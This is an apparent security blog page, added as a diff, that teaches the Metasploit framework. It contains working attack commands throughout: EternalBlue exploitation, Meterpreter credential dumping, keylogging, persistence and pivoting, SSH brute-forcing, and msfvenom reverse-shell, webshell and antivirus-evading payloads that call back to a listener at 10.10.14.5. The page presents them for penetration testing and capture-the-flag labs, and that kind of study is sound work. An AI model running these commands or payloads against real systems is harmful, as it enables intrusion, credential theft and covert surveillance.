@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>Metasploit – From Recon to Shell — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-tools">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-tools">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">Metasploit – From Recon to Shell</h1>
+    <div class="post-meta">
+      <time>2026-06-03</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">1 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/tools/" class="cat-badge cat-badge-link cat-tools">Tools</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">metasploit</span>
+          
+            <span class="tag">msfconsole</span>
+          
+            <span class="tag">msfvenom</span>
+          
+            <span class="tag">exploitation</span>
+          
+            <span class="tag">pentesting</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">Metasploit is the most widely used exploitation framework. Learn msfconsole navigation, exploit and payload selection, Meterpreter post-exploitation, msfvenom payload crafting, and auxiliary scanning — from first launch to full shell.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">What is Metasploit?</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Metasploit Framework</strong> is an open-source exploitation framework that provides a unified interface for finding, exploiting, and post-exploiting vulnerabilities. It ships with thousands of modules:</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Module Type</th><th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**Exploit**</td><td>Triggers a vulnerability to gain code execution</td>
+                </tr>
+              
+                <tr>
+                  <td>**Payload**</td><td>Code delivered after a successful exploit</td>
+                </tr>
+              
+                <tr>
+                  <td>**Auxiliary**</td><td>Scanners, fuzzers, brute-forcers, info gathering</td>
+                </tr>
+              
+                <tr>
+                  <td>**Post**</td><td>Post-exploitation: privesc, pivoting, credential dump</td>
+                </tr>
+              
+                <tr>
+                  <td>**Encoder**</td><td>Obfuscate payloads to evade AV</td>
+                </tr>
+              
+                <tr>
+                  <td>**Nop**</td><td>NOP sled generators for shellcode alignment</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The two most-used tools in the suite are <strong>msfconsole</strong> (interactive shell) and <strong>msfvenom</strong> (standalone payload generator).</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">msfconsole – Basic Navigation</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Launch (with DB support if postgresql is running)
+msfconsole
+
+# Quiet launch (skip the banner)
+msfconsole -q
+
+# Run a single command and exit
+msfconsole -q -x &#39;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run&#39;
+
+# Core commands inside msfconsole
+help                  # show all commands
+version               # framework version
+search &lt;term&gt;         # search modules
+use &lt;module&gt;          # select a module
+info                  # show module details
+show options          # show required/optional settings
+show payloads         # payloads compatible with current exploit
+set &lt;OPT&gt; &lt;value&gt;     # set an option
+unset &lt;OPT&gt;           # clear an option
+setg &lt;OPT&gt; &lt;value&gt;    # set globally (persists across modules)
+run / exploit         # run the module
+back                  # leave current module
+sessions              # list active sessions
+sessions -i &lt;id&gt;      # interact with a session
+jobs                  # list background jobs
+kill &lt;id&gt;             # kill a job</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Searching and Selecting Modules</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Search by CVE
+msf&gt; search cve:2021-44228
+msf&gt; search cve:2017-0144
+
+# Search by name / platform
+msf&gt; search eternalblue
+msf&gt; search type:exploit platform:windows smb
+msf&gt; search type:auxiliary scanner ssh
+
+# Search by rank (excellent = most reliable)
+msf&gt; search rank:excellent type:exploit
+
+# Use a module by search result index or full path
+msf&gt; use 0
+msf&gt; use exploit/windows/smb/ms17_010_eternalblue
+
+# Show full module info (description, refs, reliability)
+msf&gt; info exploit/windows/smb/ms17_010_eternalblue
+
+# Check if a target is vulnerable before exploiting
+msf exploit(ms17_010_eternalblue)&gt; check</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">Standard Exploit Workflow</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># 1. Select the exploit
+msf&gt; use exploit/windows/smb/ms17_010_eternalblue
+
+# 2. Review options
+msf exploit(ms17_010_eternalblue)&gt; show options
+
+# 3. Set target
+msf exploit(ms17_010_eternalblue)&gt; set RHOSTS 10.10.10.40
+msf exploit(ms17_010_eternalblue)&gt; set RPORT 445      # usually default
+
+# 4. List compatible payloads
+msf exploit(ms17_010_eternalblue)&gt; show payloads
+
+# 5. Select payload
+msf exploit(ms17_010_eternalblue)&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 6. Set payload options
+msf exploit(ms17_010_eternalblue)&gt; set LHOST 10.10.14.5
+msf exploit(ms17_010_eternalblue)&gt; set LPORT 4444
+
+# 7. Run
+msf exploit(ms17_010_eternalblue)&gt; run
+
+# Run in background (keep msfconsole interactive)
+msf exploit(ms17_010_eternalblue)&gt; run -j</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">Payloads – Staged vs Stageless</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <code>/</code> separator in payload names has a specific meaning:</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Format</th><th>Example</th><th>How it works</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**Staged** `type/arch/payload`</td><td>`windows/x64/meterpreter/reverse_tcp`</td><td>Small stager connects back, downloads full payload</td>
+                </tr>
+              
+                <tr>
+                  <td>**Stageless** `type/arch/payload_tcp`</td><td>`windows/x64/meterpreter_reverse_tcp`</td><td>Full payload in one binary, no second connection</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Use <strong>staged</strong> when size matters (shellcode injection). Use <strong>stageless</strong> when the delivery is a standalone file and reliability matters (AV evasion, unstable networks).</p>
+<p>Common payload families:</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Payload</th><th>OS</th><th>Notes</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`meterpreter/reverse_tcp`</td><td>Win/Linux</td><td>Feature-rich, in-memory</td>
+                </tr>
+              
+                <tr>
+                  <td>`meterpreter/reverse_https`</td><td>Win/Linux</td><td>Encrypted, blends with HTTPS traffic</td>
+                </tr>
+              
+                <tr>
+                  <td>`shell/reverse_tcp`</td><td>All</td><td>Plain netcat-style shell</td>
+                </tr>
+              
+                <tr>
+                  <td>`powershell/reverse_tcp`</td><td>Windows</td><td>PowerShell session</td>
+                </tr>
+              
+                <tr>
+                  <td>`python/meterpreter/reverse_tcp`</td><td>Linux/Mac</td><td>Pure Python, no binary needed</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">Meterpreter – Post-Exploitation</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Meterpreter</strong> runs entirely in memory, uses encrypted communication, and provides a rich API for post-exploitation. Once you have a session:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Basic situational awareness
+meterpreter&gt; sysinfo           # OS, hostname, architecture
+meterpreter&gt; getuid            # current user
+meterpreter&gt; getpid            # current process ID
+meterpreter&gt; ps                # list running processes
+meterpreter&gt; netstat           # network connections
+meterpreter&gt; ipconfig          # network interfaces
+
+# Filesystem
+meterpreter&gt; pwd               # current directory
+meterpreter&gt; ls                # list files
+meterpreter&gt; cd C:\\Users
+meterpreter&gt; cat &#39;flag.txt&#39;
+meterpreter&gt; download file.txt /tmp/
+meterpreter&gt; upload /tmp/tool.exe C:\\Windows\\Temp\\
+meterpreter&gt; search -f *.txt -d C:\\Users  # find files
+
+# Shell access
+meterpreter&gt; shell             # drop to OS shell (cmd.exe / bash)
+meterpreter&gt; execute -f cmd.exe -i -H   # hidden interactive shell
+
+# Privilege escalation
+meterpreter&gt; getsystem         # attempt automated privesc
+meterpreter&gt; getuid            # verify if SYSTEM
+
+# Credential dumping
+meterpreter&gt; hashdump          # dump local SAM hashes
+meterpreter&gt; run post/windows/gather/credentials/credential_collector
+
+# Pivoting
+meterpreter&gt; run post/multi/manage/shell_to_meterpreter
+meterpreter&gt; portfwd add -l 3389 -p 3389 -r 10.10.10.5  # port forward RDP
+meterpreter&gt; run post/multi/manage/autoroute              # add pivot routes
+
+# Persistence
+meterpreter&gt; run post/windows/manage/persistence_exe STARTUP=SCHEDULER
+
+# Screenshot / keylogger
+meterpreter&gt; screenshot
+meterpreter&gt; keyscan_start
+meterpreter&gt; keyscan_dump
+meterpreter&gt; keyscan_stop</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">Auxiliary Modules – Scanning &amp; Brute-Force</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Port scanner
+msf&gt; use auxiliary/scanner/portscan/tcp
+msf&gt; set RHOSTS 10.10.10.0/24
+msf&gt; set PORTS 22,80,443,445,3389
+msf&gt; run
+
+# SMB version scanner
+msf&gt; use auxiliary/scanner/smb/smb_version
+msf&gt; set RHOSTS 10.10.10.0/24
+msf&gt; run
+
+# SMB vulnerability check (MS17-010)
+msf&gt; use auxiliary/scanner/smb/smb_ms17_010
+msf&gt; set RHOSTS 10.10.10.40
+msf&gt; run
+
+# SSH brute-force
+msf&gt; use auxiliary/scanner/ssh/ssh_login
+msf&gt; set RHOSTS 10.10.10.22
+msf&gt; set USER_FILE /usr/share/wordlists/users.txt
+msf&gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf&gt; set STOP_ON_SUCCESS true
+msf&gt; run
+
+# HTTP directory scanner
+msf&gt; use auxiliary/scanner/http/dir_scanner
+msf&gt; set RHOSTS 10.10.10.10
+msf&gt; set RPORT 80
+msf&gt; run
+
+# FTP anonymous login
+msf&gt; use auxiliary/scanner/ftp/anonymous
+msf&gt; set RHOSTS 10.10.10.0/24
+msf&gt; run
+
+# SNMP community string sweep
+msf&gt; use auxiliary/scanner/snmp/snmp_login
+msf&gt; set RHOSTS 10.10.10.0/24
+msf&gt; run</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">msfvenom – Standalone Payload Generation</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>msfvenom</code> generates payloads as files — executables, shellcode, scripts — for delivery outside of msfconsole.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># List all payloads
+msfvenom -l payloads
+
+# List formats
+msfvenom --list formats
+
+# Windows x64 reverse Meterpreter EXE
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f exe -o shell.exe
+
+# Windows stageless (better for delivery)
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f exe -o shell_stageless.exe
+
+# Linux ELF reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f elf -o shell.elf &amp;&amp; chmod +x shell.elf
+
+# PHP webshell
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f raw -o shell.php
+
+# Python reverse shell
+msfvenom -p python/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f raw -o shell.py
+
+# ASP/ASPX webshell
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f aspx -o shell.aspx
+
+# Raw shellcode (for injection)
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f c          # C array
+  -f py         # Python bytes
+  -f raw &gt; shell.bin
+
+# Encode to bypass basic AV
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -e x64/xor_dynamic -i 5 \
+  -f exe -o encoded.exe</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">Multi/Handler – Catching Shells</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>When you deliver a payload via msfvenom (or any other method), you need a listener to catch the connection. <code>multi/handler</code> is Metasploit's universal listener.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">msf&gt; use exploit/multi/handler
+msf&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf&gt; set LHOST 10.10.14.5
+msf&gt; set LPORT 4444
+msf&gt; set ExitOnSession false   # keep listener alive for multiple shells
+msf&gt; run -j                    # run as background job
+
+# Catch multiple sessions
+msf&gt; sessions                  # list all active sessions
+msf&gt; sessions -i 1             # interact with session 1
+msf&gt; sessions -u 1             # upgrade session 1 to meterpreter
+
+# Kill / background a session
+meterpreter&gt; background        # send session to background
+meterpreter&gt; exit              # close the session</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">Database Integration</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Start PostgreSQL and init the DB (first time)
+sudo systemctl start postgresql
+msfdb init
+
+# Connect from msfconsole
+msf&gt; db_status
+
+# Import nmap scan results
+msf&gt; db_import /tmp/nmap_scan.xml
+
+# Run nmap directly and store results
+msf&gt; db_nmap -sV -sC -p- 10.10.10.40
+
+# Browse discovered hosts / services
+msf&gt; hosts
+msf&gt; services
+msf&gt; services -p 445           # filter by port
+msf&gt; vulns                     # show detected vulnerabilities
+
+# Export workspace
+msf&gt; workspace                 # list workspaces
+msf&gt; workspace -a htb_box      # create new workspace
+msf&gt; workspace htb_box         # switch workspace</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">11</span>
+            <span class="heading-text">Real-World Use Cases</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Internal Penetration Tests</strong><br>
+- Run <code>db_nmap</code> to populate hosts/services, then use <code>vulns</code> to prioritise targets<br>
+- Chain auxiliary scanners to identify weak credentials (SSH, SMB, FTP, RDP) across a /24 before touching a single exploit<br>
+- Use <code>multi/handler</code> with <code>ExitOnSession false</code> as a persistent listener for phishing payload callbacks<br>
+- Post-exploitation: <code>run post/windows/gather/enum_domain</code> maps AD structure from a single compromised workstation</p>
+<p><strong>Red Team Operations</strong><br>
+- Generate stageless HTTPS Meterpreter payloads (<code>meterpreter_reverse_https</code>) for phishing — encrypted and blends with normal web traffic<br>
+- Use <code>portfwd</code> and <code>autoroute</code> to pivot through a DMZ host into the internal network without additional tooling<br>
+- <code>hashdump</code> → pass-the-hash with <code>psexec</code> module, or crack offline with hashcat</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">12</span>
+            <span class="heading-text">CTF / HTB Workflow</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Step 1: Recon with DB
+msf&gt; workspace -a &lt;box_name&gt;
+msf&gt; db_nmap -sV -sC -p- &lt;target_ip&gt;
+msf&gt; services
+
+# Step 2: Check for known exploits on discovered services
+msf&gt; search type:exploit name:eternalblue
+msf&gt; search type:exploit name:shellshock
+msf&gt; search cve:2021-3156     # sudo heap overflow (Baron Samedit)
+
+# Step 3: Exploit + handler
+msf&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf&gt; set RHOSTS &lt;target_ip&gt;
+msf&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf&gt; set LHOST tun0            # HTB VPN interface
+msf&gt; run
+
+# Step 4: Post-exploitation
+meterpreter&gt; sysinfo
+meterpreter&gt; getuid
+meterpreter&gt; getsystem
+meterpreter&gt; hashdump
+meterpreter&gt; search -f user.txt -d C:\\
+meterpreter&gt; search -f root.txt -d C:\\
+
+# Step 5: If you get a shell, upgrade to meterpreter
+msf&gt; use post/multi/manage/shell_to_meterpreter
+msf&gt; set SESSION 1
+msf&gt; run
+
+# Step 6: Pivot to internal network
+meterpreter&gt; run post/multi/manage/autoroute
+msf&gt; use auxiliary/scanner/portscan/tcp
+msf&gt; set RHOSTS 172.16.0.0/24
+msf&gt; run</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-info">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+              
+              <span>CTF Tips:</span>
+            </div>
+          
+          <div class="note-body"><ul>
+<li>Set <code>LHOST tun0</code> on HTB/TryHackMe — this auto-resolves to your VPN IP</li>
+<li><code>sessions -u &lt;id&gt;</code> upgrades a plain shell to Meterpreter in one command</li>
+<li>If <code>getsystem</code> fails, run <code>run post/multi/recon/local_exploit_suggester</code> — it lists local privesc modules that match the target OS</li>
+<li>For Linux boxes: <code>run post/linux/gather/enum_system</code> grabs OS info, cron jobs, SUID binaries, and sudo rules in one go</li>
+<li>Use <code>run -j</code> to background exploits; catch sessions with <code>sessions -i &lt;id&gt;</code> after they connect</li>
+</ul>
+<p><strong>Quick Reference:</strong></p>
+<pre><code>msfconsole -q                        # quiet start
+search cve:&lt;year&gt;-&lt;id&gt;               # find module by CVE
+set PAYLOAD &lt;tab&gt;                    # tab-complete payloads
+show missing                         # see which options are unset
+run -j / sessions / sessions -i &lt;n&gt;  # background + interact
+msfvenom -p &lt;payload&gt; LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f &lt;fmt&gt; -o out
+</code></pre></div>
+        </div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/sql-sqlmap-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">SQL Injection &amp; sqlmap – From Manual Payloads to Full Dumps</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">SQL injection is one of the most impactful web vulnerabilities. Learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap — from basic dumps to OS shell access.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/snmp-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">SNMP – Network Intelligence &amp; Enumeration</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">SNMP exposes a wealth of device info — system details, interfaces, running processes, installed software. Learn to query it, brute-force community strings, and extract data for both ops and offensive use.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/ldap-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">LDAP – Directory Enumeration &amp; Active Directory Recon</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">LDAP is the backbone of Active Directory. Learn to query it anonymously and with credentials to extract users, groups, computers, and policies — essential for both AD administration and offensive enumeration.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
